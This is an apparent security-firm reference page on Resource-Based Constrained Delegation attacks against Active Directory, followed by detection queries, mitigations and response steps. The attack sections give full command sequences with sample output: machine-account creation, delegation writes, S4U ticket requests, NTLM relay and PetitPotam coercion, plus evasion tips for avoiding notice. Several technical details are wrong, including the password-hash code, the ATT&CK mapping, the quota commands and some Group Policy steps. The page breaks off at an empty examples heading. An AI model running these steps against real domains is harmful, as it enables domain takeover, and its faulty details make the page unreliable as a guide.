# [PE-TOKEN-002]: Resource-Based Constrained Delegation (RBCD)

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-002 |
| **MITRE ATT&CK v18.1** | [T1134.005 - Access Token Manipulation: SID History Injection / Delegation Abuse](https://attack.mitre.org/techniques/T1134/005/) |
| **Tactic** | Privilege Escalation, Lateral Movement |
| **Platforms** | Windows AD (Domain Controller Functional Level 2012+) |
| **Severity** | Critical |
| **CVE** | CVE-2021-42287 (SamAccountName Spoofing combined with RBCD), CVE-2022-26923 (Certificate-Based RBCD) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2012-2025 (any DCFL 2012+) |
| **Patched In** | Not patched (privilege-based configuration vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Resource-Based Constrained Delegation (RBCD) is a privilege escalation and lateral movement technique that exploits poorly configured Active Directory permissions. Unlike traditional constrained delegation (configured on service accounts), RBCD is configured on the **target resource** (typically a computer account) via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. An attacker with write access to this attribute (via GenericWrite, GenericAll, or owning the object) can populate it with a controlled account's Security Identifier (SID). This allows the controlled account to use Kerberos S4U2Self and S4U2Proxy extensions to request service tickets on behalf of any user (except Protected Users) to access the target resource. Combined with **MachineAccountQuota** (default 10 computer accounts per user), attackers can create a new machine account, configure RBCD, and escalate to Domain Admin.

**Attack Surface:** Active Directory computer objects with misconfigured permissions, domain controllers, Exchange servers, file servers, and any resource with write-accessible delegation settings. Common entry points include LDAP relay attacks (via NTLM relay), compromised service accounts with write permissions, or exploitation of the **CVE-2021-42287** (SamAccountName Spoofing) vulnerability combined with RBCD.

**Business Impact:** **Critical – Full domain compromise.** Successful RBCD abuse enables attackers to impersonate any domain user (including Domain Admins, except Protected Users members) and access any resource the target is configured to access. This leads to credential theft, data exfiltration, ransomware deployment, and persistent backdoors.

**Technical Context:** RBCD exploitation typically takes 5-15 minutes once write access is obtained. The attack chain involves: (1) creating a machine account (if not already compromised), (2) modifying the target's delegation attribute, (3) requesting S4U tickets, (4) accessing the resource as the impersonated user. The technique is stealthy because it leverages legitimate Kerberos mechanisms and may blend with normal authentication traffic.

### Operational Risk
- **Execution Risk:** Medium – Requires write access to target object; relies on standard Kerberos protocol (reliable execution if preconditions met)
- **Stealth:** Medium-High – Generates Event ID 4768 (TGT request) and 4769 (Service ticket), but may appear as legitimate delegated auth
- **Reversibility:** No – Modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity` are persistent until explicitly removed

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Control 5.3 / 6.2 | Restrict delegation rights; monitor for unauthorized delegation configurations |
| **DISA STIG** | WN10-AU-000505 | Audit Privilege Use; detect unauthorized Kerberos delegation |
| **CISA SCuBA** | ADO-2.1 | Active Directory Security: Delegation configuration review and monitoring |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Control), AC-6 (Least Privilege) | Limit delegation rights; enforce principle of least privilege |
| **GDPR** | Article 32 | Security of Processing: Detect and prevent unauthorized access delegation |
| **DORA** | Article 9 - Protection and Prevention | Implement controls for identity delegation and access management |
| **NIS2** | Article 21 - Cyber Risk Management | Manage privileged access and detect delegation misconfigurations |
| **ISO 27001** | A.9.2.3 - Management of Privileged Access Rights | Review and monitor delegation configurations; restrict to authorized accounts |
| **ISO 27005** | Risk Scenario: "Privilege Escalation via Delegation Misconfiguration" | Identify and mitigate risks associated with improperly configured RBCD |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute** on target computer (via GenericWrite, GenericAll, Owns, WriteDacl)
- **MachineAccountQuota > 0** (default 10; allows creating new machine accounts)
- Alternatively: **Compromised machine account** (can modify its own delegation attribute)
- **Service Principal Name (SPN)** on controlled account (or use SPN-less RBCD via James Forshaw technique)

**Required Access:**
- Network access to Domain Controller (port 88 for Kerberos)
- Credentials or ability to authenticate for the controlled account (with valid SPN)
- LDAP or SMB access to enumerate AD objects

**Supported Versions:**
- **Windows:** Domain Functional Level 2012 or higher (attribute introduced in Server 2012 R2)
- **PowerShell:** Version 3.0+ (for ActiveDirectory module)
- **Other Requirements:** Domain Controller with Kerberos service (always present)

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (Latest: v1.7, Supports Kerberos S4U operations)
- [PowerMad](https://github.com/Kevin-Robertson/Powermad) (Version 3.0+, Creates machine accounts)
- [StandIn](https://github.com/FuzzySecurity/StandIn) (Alternative for modifying RBCD attributes)
- [Impacket](https://github.com/fortra/impacket) – `rbcd.py`, `getST.py` (Python RBCD/S4U tools)
- [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (LDAP relay with `--delegate-access` flag)
- BloodHound / SharpHound (Enumerate delegation paths)
- [BloodyAD](https://github.com/CoolHandMike/BloodyAD) (Alternative: RBCD attribute modification via LDAP)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Enumerate MachineAccountQuota (Permission to Create Accounts):**

```powershell
# Check if current user can create machine accounts
$rootDSE = Get-ADRootDSE
$forest = Get-ADForest
Get-ADObject -Identity "CN=ms-DS-MachineAccountQuota,$((Get-ADRootDSE).defaultNamingContext)" -Properties *

# Alternative: Query directly
Get-ADObject -Identity "CN=ms-DS-MachineAccountQuota,$($(Get-ADRootDSE).defaultNamingContext)" | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
```

**Expected Output:** If value > 0, users can create new machine accounts; if 0, only existing compromised accounts can be used.

**Enumerate RBCD-Vulnerable Targets:**

```powershell
# Find computer objects with msDS-AllowedToActOnBehalfOfOtherIdentity attribute set
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Alternative: Check current permissions on a target
Get-ADComputer -Identity "DC01$" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object msDS-AllowedToActOnBehalfOfOtherIdentity
```

**What to Look For:**
- Computers with RBCD already configured (existing attacks or legitimate delegation)
- Target domain controllers, file servers, Exchange servers
- Any computer with easily abusable permissions

**Version Note:** All commands work on Server 2012+ (DCFL 2012+).

### Linux/Bash Reconnaissance

**Enumerate RBCD via Impacket:**

```bash
# Query for computers with RBCD configured
python3 -m impacket.examples.GetADUsers -dc-ip 10.0.0.1 -all 'DOMAIN/user:password' | grep -i "allowedtoactonbehalfofotheridentity"

# Alternative: Use ldapsearch
ldapsearch -x -H ldap://DC01 -b "dc=domain,dc=com" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Check Domain Functional Level:**

```bash
# Query DFL
ldapsearch -x -H ldap://DC01 -b "CN=Directory Service,CN=WindowsNT,CN=Services,CN=Configuration,dc=domain,dc=com" "domainFunctionality" | grep -i "DomainFunctionality"
```

**What to Look For:**
- `DomainFunctionality: 10` or higher (2012 or higher)
- LDAP attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` present on target

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Classical RBCD Attack via PowerMad + Rubeus (Windows)

**Supported Versions:** Domain Functional Level 2012+

**Prerequisites:**
- MachineAccountQuota > 0 (ability to create machine account)
- Write access to target's RBCD attribute (or via LDAP relay)

#### Step 1: Create Machine Account with PowerMad

**Objective:** Create a new computer account with a set password and SPN.

**Command:**

```powershell
# Import PowerMad
. .\Powermad.ps1

# Create new machine account with password
New-MachineAccount -MachineAccount "RBCDMachine" -Password $(ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Domain "domain.com" -DomainController "DC01"
```

**Expected Output:**

```
[*] Machine account 'RBCDMachine$' created successfully
[*] Password set to: P@ssw0rd123!
[*] SID: S-1-5-21-123456789-123456789-123456789-5501
```

**What This Means:**
- Machine account created with name `RBCDMachine$`
- Password hash can be computed for later S4U requests
- SID will be used to modify the target's RBCD attribute

**OpSec & Evasion:**
- Use obfuscated names: "RBCDMachine" → "SRVR-UPDATE", "PRINTER-SYNC", etc.
- Avoid naming patterns that suggest attack tools
- Detection likelihood: Low-Medium (Event ID 4741: Machine Account Created)

**Troubleshooting:**
- **Error:** `[-] Access denied creating machine account`
  - **Cause:** MachineAccountQuota is 0 or user lacks permissions
  - **Fix (All Versions):** Use existing compromised machine account instead

#### Step 2: Compute Hash of Machine Account Password

**Objective:** Calculate the RC4/AES256 hash needed for Kerberos S4U operations.

**Command:**

```powershell
# Calculate RC4 (NTLM) hash
$password = 'P@ssw0rd123!'
$ntHash = (New-Object System.Text.UTF8Encoding).GetBytes($password) | ForEach-Object { [Convert]::ToString($_, 16).PadLeft(2,'0') }

# Alternative: Use Rubeus to calculate hash
.\Rubeus.exe hash /password:P@ssw0rd123! /user:RBCDMachine /domain:domain.com
```

**Expected Output:**

```
Hash: 4D967A2A9CFB40677BDA6F13DD7F65B3
```

**What This Means:**
- RC4 hash is used in S4U requests to prove control of the machine account
- Store this hash for later Rubeus commands

#### Step 3: Modify Target's RBCD Attribute (GenericWrite Method)

**Objective:** Add the machine account's SID to the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

**Command (Via PowerShell – Set-ADComputer):**

```powershell
# Get the SID of the machine account
$machineAccountSID = (Get-ADComputer "RBCDMachine$").SID

# Get the target computer
$targetComputer = Get-ADComputer "TARGETDC$"

# Set RBCD permissions
Set-ADComputer -Identity $targetComputer -PrincipalsAllowedToDelegateToAccount @(Get-ADComputer "RBCDMachine$")
```

**Alternative Command (Via PowerView – Domain admin rights may vary):**

```powershell
# Populate msDS-AllowedToActOnBehalfOfOtherIdentity security descriptor
$SDBytes = @()
$machineAccount = Get-ADComputer "RBCDMachine$"
$SDBytes = (Get-DomainComputer $machineAccount.SamAccountName).msds-allowedtoactonbehalfofotheridentity

# Set on target
Get-DomainComputer "TARGETDC$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**Expected Output:**

```
[*] RBCD attribute modified successfully on TARGETDC$
```

**What This Means:**
- Target now allows RBCDMachine$ to impersonate any user to access it (except Protected Users)
- S4U2Proxy requests from RBCDMachine$ will be allowed

**OpSec & Evasion:**
- Perform this action immediately after machine account creation to avoid discovery window
- This operation generates Event ID 5136 (AD object modified)
- Detection likelihood: Medium (if auditing is enabled)

**Troubleshooting:**
- **Error:** `[-] Access denied modifying RBCD attribute`
  - **Cause:** User lacks GenericWrite on target
  - **Fix (All Versions):** Use LDAP relay (ntlmrelayx) to perform modification via relayed authentication

#### Step 4: Request TGT for Machine Account

**Objective:** Obtain a Kerberos TGT for the controlled machine account.

**Command (Rubeus):**

```powershell
# Request TGT for the machine account
.\Rubeus.exe asktgt /user:RBCDMachine$ /rc4:4D967A2A9CFB40677BDA6F13DD7F65B3 /domain:domain.com /dc:DC01.domain.com /outfile:RBCDMachine.kirbi
```

**Expected Output:**

```
[*] Requesting TGT for 'RBCDMachine$'...
[*] Ticket obtained and saved to RBCDMachine.kirbi
[*] SPN: krbtgt/DOMAIN.COM
[*] Ticket valid until: 2025-01-10 09:12:00
```

**What This Means:**
- TGT (Ticket-Granting Ticket) obtained for machine account
- This ticket proves identity and is required for S4U2Self requests

#### Step 5: Perform S4U2Self Request (Obtain Service Ticket for User)

**Objective:** Request a service ticket on behalf of a target user (e.g., Administrator).

**Command:**

```powershell
# S4U2Self: Request ticket to self (RBCDMachine$) on behalf of Administrator
.\Rubeus.exe s4u /ticket:RBCDMachine.kirbi /user:RBCDMachine$ /rc4:4D967A2A9CFB40677BDA6F13DD7F65B3 /impersonateuser:Administrator /msdsspn:"cifs/TARGETDC.domain.com" /nowrap
```

**Alternative (Via Impacket - Linux):**

```bash
# Using Impacket getST.py
python3 -m impacket.examples.getST -self -impersonate Administrator -dc-ip 10.0.0.1 -spn "cifs/TARGETDC.domain.com" "domain.com/RBCDMachine$:P@ssw0rd123!"
```

**Expected Output:**

```
[*] S4U2Self successful
[*] Ticket for Administrator to RBCDMachine$ obtained
[*] Ticket saved: Administrator@cifs.kirbi
```

**What This Means:**
- Service ticket obtained for Administrator to access CIFS (file share) on TARGETDC
- Can now use this ticket to authenticate as Administrator

#### Step 6: Perform S4U2Proxy Request (Request Ticket to Target Service)

**Objective:** Convert the user's service ticket into a ticket for the actual target service.

**Command:**

```powershell
# S4U2Proxy: Use the S4U2Self ticket to request ticket to actual service
.\Rubeus.exe s4u /ticket:RBCDMachine.kirbi /user:RBCDMachine$ /rc4:4D967A2A9CFB40677BDA6F13DD7F65B3 /impersonateuser:Administrator /msdsspn:"cifs/TARGETDC.domain.com" /ptt /nowrap
```

**Expected Output:**

```
[*] S4U2Proxy successful
[*] Service ticket for Administrator@cifs/TARGETDC obtained
[*] Ticket imported into session context (PTT)
```

**What This Means:**
- Final service ticket obtained and injected into process token cache (PTT = Pass-the-Ticket)
- Ready to access CIFS share on TARGETDC as Administrator

**OpSec & Evasion:**
- Use `/ptt` to immediately inject into memory (avoids writing .kirbi files to disk)
- Combine steps 5-6 into single Rubeus command for speed
- Detection likelihood: Medium-High (Event ID 4768, 4769 with S4U flags)

**Troubleshooting:**
- **Error:** `[-] S4U2Proxy failed: KDC_ERR_BADOPTION`
  - **Cause:** Target not configured with RBCD or SPN doesn't match
  - **Fix (All Versions):** Verify RBCD attribute was set correctly; check SPN spelling

#### Step 7: Access Target Resource as Impersonated User

**Objective:** Use the forged ticket to access the target resource.

**Command (Access CIFS share):**

```powershell
# Access file share using the injected ticket
dir \\TARGETDC.domain.com\c$

# Alternative: Use with smbclient (Linux)
# smbclient -k -U "Administrator" \\\\TARGETDC.domain.com\\c$
```

**Expected Output:**

```
Directory of \\TARGETDC.domain.com\c$

<DIR>    Program Files
<DIR>    Windows
<FILE>   secrets.txt  1234 bytes
```

**What This Means:**
- Successfully accessed resource as Administrator using forged ticket
- Can now read/write files, upload malware, execute code, etc.

---

### METHOD 2: LDAP Relay + RBCD Attack (NTLM Relay via ntlmrelayx)

**Supported Versions:** Domain Functional Level 2012+

**Prerequisites:**
- Network position to intercept NTLM authentication (ARP spoofing, DNS poisoning, etc.)
- LDAP relay target available

#### Step 1: Set Up NTLM Relay Server (ntlmrelayx with --delegate-access)

**Objective:** Configure ntlmrelayx to automatically modify RBCD when relaying LDAP auth.

**Command (On Attacker Machine):**

```bash
# Run ntlmrelayx with automatic RBCD setup
python3 -m impacket.examples.ntlmrelayx -t ldap://DC01.domain.com --delegate-access -smb2support
```

**Expected Output:**

```
[*] Starting relay server...
[*] Listening on port 445...
[*] Waiting for NTLM authentication...
[*] Accepted relay from CLIENT01$ to ldap://DC01.domain.com
[*] Successfully modified RBCD on CLIENT01$
[*] Object can now act on behalf of any user (created machine account: NTLMRELAYX_SRV$)
```

**What This Means:**
- ntlmrelayx automatically created a machine account and configured RBCD
- Any machine authenticating to attacker is now compromised for RBCD

#### Step 2: Coerce Authentication (Trigger NTLM Auth from Target)

**Objective:** Force a target machine to authenticate to attacker's relay server.

**Command (PetitPotam / PrinterBug coercion):**

```bash
# Use Petitpotam to coerce DC to authenticate
python3 Petitpotam.py -u user -p password -d domain.com attacker-ip dc-ip
```

**Alternative: Print Spooler Coercion:**

```bash
# Use printerbug.py
python3 printerbug.py domain.com/user:password@TARGET_DC attacker-ip
```

**Expected Output (on ntlmrelayx):**

```
[*] Received NTLM authentication from DC01$
[*] Relaying to ldap://DC01.domain.com
[*] Successfully modified RBCD configuration
```

#### Step 3: Exploit RBCD (Steps 4-7 from Method 1)

**Objective:** Use the now-compromised machine account to perform S4U attacks.

**Command:**

```bash
# Use getST.py to request service tickets
python3 -m impacket.examples.getST -impersonate Administrator -dc-ip 10.0.0.1 "domain.com/NTLMRELAYX_SRV$:password" -spn "cifs/DC01.domain.com"
```

---

### METHOD 3: SPN-less RBCD Attack (James Forshaw Technique)

**Supported Versions:** Domain Functional Level 2012+ (with workarounds for SPN requirement)

**Prerequisites:**
- Write access to target's RBCD attribute
- Sacrificial user account (password will be reset)
- No need for MachineAccountQuota > 0

#### Step 1: Create Sacrificial User Account

**Objective:** Create a user that will be used for SPN-less RBCD (will be unusable after attack).

**Command:**

```powershell
# Create user account without SPN
New-ADUser -Name "SPNlessUser" -AccountPassword (ConvertTo-SecureString 'TempPassword123!' -AsPlainText -Force) -Enabled $true
```

#### Step 2: Set RBCD to Allow SPNless User

**Objective:** Configure target to allow SPN-less user delegation.

**Command:**

```powershell
# Set RBCD on target for SPN-less user
Set-ADComputer -Identity "TARGETDC$" -PrincipalsAllowedToDelegateToAccount (Get-ADUser "SPNlessUser")
```

#### Step 3: Obtain TGT and Modify User's Password Hash

**Objective:** Get TGT for SPN-less user, reset password hash to TGT session key.

**Command:**

```bash
# Get TGT for SPNless user
python3 -m impacket.examples.getTGT "domain.com/SPNlessUser:TempPassword123!" -dc-ip 10.0.0.1 -outputfile SPNlessUser.ccache

# Extract session key and reset user's password to session key
# (Complex manipulation - refer to James Forshaw's POC)
```

#### Step 4-7: Proceed with S4U2Self/S4U2Proxy (Refer to Method 1 Steps 5-7)

**Note:** This method is complex and typically used when MachineAccountQuota = 0.

---

## 6. TOOLS & COMMANDS REFERENCE

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.7+

**Supported Platforms:** Windows (all versions with .NET 4.5+)

**Installation:**

```bash
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
msbuild /p:Configuration=Release
# Binary: Rubeus\bin\Release\Rubeus.exe
```

**Common Commands:**

```powershell
# Request TGT
Rubeus.exe asktgt /user:RBCDMACHINE$ /rc4:HASH /domain:domain.com /dc:DC01 /outfile:ticket.kirbi

# S4U2Self/S4U2Proxy combined
Rubeus.exe s4u /ticket:ticket.kirbi /user:RBCDMACHINE$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET /ptt

# Inject ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

### [PowerMad](https://github.com/Kevin-Robertson/Powermad)

**Version:** 3.0+

**Installation:**

```powershell
. .\Powermad.ps1
```

**Commands:**

```powershell
# Create machine account
New-MachineAccount -MachineAccount TestMachine -Password $(ConvertTo-SecureString 'Password!' -AsPlainText -Force)

# Disable machine account
Disable-MachineAccount -MachineAccount TestMachine
```

---

### [Impacket – rbcd.py](https://github.com/fortra/impacket)

**Commands:**

```bash
# Read RBCD
python3 rbcd.py -action read -delegate-to TARGET$ domain/user:password@DC

# Write RBCD
python3 rbcd.py -action write -delegate-from SOURCE$ -delegate-to TARGET$ domain/user:password@DC

# Clear RBCD
python3 rbcd.py -action clear -delegate-to TARGET$ domain/user:password@DC
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4768 (Kerberos TGT Request)**

- **Log Source:** Security (Domain Controller)
- **Trigger:** TGT requested with S4U flags (S4U2Self/S4U2Proxy indicators)
- **Filter:** `EventID=4768 AND TicketOptions contains "0x4080"`
- **Applies To Versions:** Server 2012+

**Event ID: 5136 (AD Object Modified)**

- **Log Source:** Directory Service
- **Trigger:** `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute changed
- **Filter:** `AttributeLDAPDisplayName = msDS-AllowedToActOnBehalfOfOtherIdentity`
- **Applies To Versions:** Server 2012+

**Manual Configuration Steps (Enable Directory Service Auditing):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies - DC Only** → **DS Access**
3. Enable: **Audit Directory Service Changes** (Set to **Success and Failure**)
4. Run `gpupdate /force` on domain controllers

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon XML Configuration (Detect RBCD-Related Activity):**

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Rule: Detect Kerberos S4U operations (Process Pattern) -->
    <RuleGroup name="RBCD - S4U Operations" groupRelation="and">
      <ProcessCreate onmatch="include">
        <!-- Detect Rubeus s4u command execution -->
        <CommandLine condition="contains any">s4u;S4U;/s4u;/S4U</CommandLine>
        <Image condition="contains">rubeus</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- Rule: Detect PowerMad machine account creation -->
    <RuleGroup name="RBCD - PowerMad Execution" groupRelation="and">
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains any">New-MachineAccount;PowerMad;Powermad</CommandLine>
      </ProcessCreate>
    </RuleGroup>

    <!-- Rule: Detect ntlmrelayx RBCD exploitation -->
    <RuleGroup name="RBCD - ntlmrelayx LDAP Relay" groupRelation="and">
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains">ntlmrelayx</CommandLine>
        <CommandLine condition="contains">--delegate-access</CommandLine>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

---

## 9. MICROSOFT SENTINEL DETECTION

### KQL Query 1: Detect S4U2Self/S4U2Proxy Kerberos Requests

```kusto
SecurityEvent
| where EventID == 4768
| where TicketOptions contains "0x40800000" or TicketOptions contains "0x40810000"  // S4U indicators
| where TicketEncryptionType == "0x17" or TicketEncryptionType == "0x18"  // RC4 or AES
| project TimeGenerated, Computer, TargetUserName, TicketOptions, TicketEncryptionType, IpAddress
| where IpAddress != "::1"  // Filter out local DC-to-DC
```

### KQL Query 2: Detect RBCD Attribute Modifications

```kusto
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName contains "msDS-AllowedToActOnBehalfOfOtherIdentity"
| project TimeGenerated, Computer, SubjectUserName, ObjectName, AttributeValue
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `RBCD Attack Detection - S4U Operations`
3. Paste KQL query
4. Run every: 5 minutes
5. Alert threshold: Any result
6. Severity: High/Critical

---

## 10. MICROSOFT DEFENDER FOR CLOUD

**Alert Name:** Suspicious Kerberos delegation operation detected

- **Severity:** High
- **Description:** Detects S4U2Self/S4U2Proxy requests indicating possible RBCD abuse
- **Remediation:** Review delegation configurations; remove unnecessary RBCD permissions

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Monitor and Audit msDS-AllowedToActOnBehalfOfOtherIdentity Modifications**

Detect any changes to RBCD attributes on critical resources.

**Applies To Versions:** Server 2012+

**Manual Steps (Enable Directory Service Auditing):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies - DC Only** → **DS Access**
3. Enable: **Audit Directory Service Changes** (Set to **Success and Failure**)
4. Double-click: **Edit Security** button
5. Configure to audit access to sensitive objects only
6. Run `gpupdate /force`

**Validation Command:**

```powershell
auditpol /get /category:"DS Access"
# Output: Directory Service Changes - Success and Failure
```

---

**2. Set MachineAccountQuota to 0 (Restrict Machine Account Creation)**

Prevent users from creating new machine accounts (eliminates common RBCD entry point).

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
3. Find: **Network access: Allow anonymous SID/Name translation** – Set to **Disabled**
4. Also set: **Allow machine account password changes** to **Disabled** if not needed
5. Run `gpupdate /force`

**Manual Steps (PowerShell – Modify Domain-Wide):**

```powershell
# Set MachineAccountQuota to 0 at domain root
Set-ADObject -Identity "CN=ms-DS-MachineAccountQuota,$(Get-ADRootDSE).defaultNamingContext" -Replace @{"ms-DS-MachineAccountQuota"=0}
```

**Validation Command:**

```powershell
Get-ADObject -Identity "CN=ms-DS-MachineAccountQuota,$(Get-ADRootDSE).defaultNamingContext" | Select-Object "ms-DS-MachineAccountQuota"
# Output: 0
```

---

**3. Remove Unnecessary RBCD Configurations**

Audit all computer objects and remove delegation rights not required by business operations.

**Manual Steps:**

```powershell
# List all computers with RBCD configured
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Remove RBCD from computer (if not needed)
Set-ADComputer -Identity "TARGETDC$" -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

### Priority 2: HIGH

**4. Enable LDAPS and Require LDAP Channel Binding (Prevent LDAP Relay)**

Mitigate LDAP relay attacks that trigger automatic RBCD modifications.

**Manual Steps (Enable LDAPS):**

1. Install certificate on Domain Controller (already done in most environments)
2. Open **Group Policy Management Console** (gpmc.msc)
3. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Net Logon**
4. Configure: **Secure channel: Digitally encrypt or sign secure channel data** – Set to **Always**
5. Configure: **Secure channel: Require strong (Windows 2000 or later) session key** – Set to **Enabled**
6. Run `gpupdate /force`

---

**5. Add Sensitive Accounts to Protected Users Group**

Protected Users group members cannot be delegated (with exception of RID 500 admin).

**Manual Steps:**

```powershell
# Add admin/service accounts to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator", "DOMAINADMIN$", "ServiceAccount"

# Verify
Get-ADGroupMember -Identity "Protected Users"
```

**Note:** This can break constrained delegation for legitimate services – test thoroughly.

---

**6. Restrict Kerberos Encryption Types (Disable RC4)**

Force AES256 instead of RC4 to complicate S4U ticket forgery.

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Kerberos**
3. Configure: **Encryption types allowed for Kerberos** – Set to **AES256_HMAC_SHA1 only**
4. Run `gpupdate /force`

---

**Validation Command (Verify All Fixes):**

```powershell
# Comprehensive RBCD hardening audit
Write-Host "[*] Checking MachineAccountQuota..."
Get-ADObject -Identity "CN=ms-DS-MachineAccountQuota,$(Get-ADRootDSE).defaultNamingContext" | Select-Object "ms-DS-MachineAccountQuota"

Write-Host "[*] Checking for RBCD configurations..."
$rbcdComputers = Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null}
if ($rbcdComputers) {
    Write-Host "[!] Found $($rbcdComputers.Count) computers with RBCD configured"
} else {
    Write-Host "[+] No RBCD configurations found (expected in hardened environment)"
}

Write-Host "[*] Checking Protected Users group..."
Get-ADGroupMember -Identity "Protected Users" | Select-Object SamAccountName

Write-Host "[*] Checking LDAPS enforcement..."
auditpol /get /subcategory:"Directory Service Changes"
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `Rubeus.exe`, `PowerMad.ps1`, `StandIn.exe` (RBCD tools)
- `ntlmrelayx.py`, `getST.py`, `rbcd.py` (Impacket scripts)
- Kerberos ticket files (*.kirbi, *.ccache)
- `C:\ProgramData\*.ccache` (Linux-style ticket cache on Windows)

**Registry:**
- Kerberos ticket cache locations
- LDAP relay artifacts

**Network:**
- Outbound Kerberos traffic (port 88) from non-DC systems
- LDAP relay on port 389/636
- Suspicious S4U Kerberos flags in network captures

**Event Logs:**
- **Event ID 4768** with S4U flags (0x4080)
- **Event ID 5136** on `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
- **Event ID 4741** (Machine account created)
- **Event ID 4742** (Machine account deleted/modified)

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` (4768, 5136 events)
- `C:\Users\*\AppData\Local\Temp\*.ccache` (Kerberos tickets)
- `.kirbi` files in temp directories
- Rubeus/PowerMad execution traces in PowerShell history

**Memory:**
- Kerberos ticket cache in LSASS process memory
- Process token privileges indicating S4U operations

**Cloud (Entra ID):**
- Audit logs showing service principal creation
- Unusual Kerberos authentication patterns

### Response Procedures

1. **Isolate:**

   ```powershell
   # Disable affected computer accounts
   Disable-ADAccount -Identity "RBCDMachine$"
   Disable-ADAccount -Identity "TARGETDC$"  # If compromised
   ```

2. **Collect Evidence:**

   ```powershell
   # Export AD change logs
   Get-WinEvent -LogName "Directory Service" -FilterXPath "*[EventData[Data[@Name='AttributeLDAPDisplayName']='msDS-AllowedToActOnBehalfOfOtherIdentity']]" | Export-Csv -Path C:\Evidence\RBCD_Changes.csv
   
   # Export Kerberos events
   wevtutil epl Security C:\Evidence\Security.evtx
   ```

3. **Remediate:**

   ```powershell
   # Remove RBCD configuration
   Set-ADComputer -Identity "TARGETDC$" -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
   
   # Delete compromised machine account
   Remove-ADComputer -Identity "RBCDMachine$" -Confirm:$false
   
   # Reset affected service account passwords
   Set-ADAccountPassword -Identity "TARGETSERVICE$" -NewPassword (ConvertTo-SecureString -AsPlainText -Force 'NewSecurePassword!')
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView Enumeration | Enumerate AD permissions and identify RBCD targets |
| **2** | **Credential Access** | [CA-DUMP-001] Mimikatz / [CA-UNSC-003] SYSVOL GPP | Obtain credentials with write access to target objects |
| **3** | **Privilege Escalation** | **[PE-TOKEN-002] RBCD Attack** | Configure delegation and impersonate domain admin |
| **4** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Create persistent backdoor access |
| **5** | **Defense Evasion** | [EVADE-IMPAIR-004] Event Log Clearing | Cover tracks and disable logging |
| **6** | **Impact** | Domain Compromise / Ransomware | Full domain takeover or data exfiltration |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: LDAP Relay + RBCD Attack (2024)

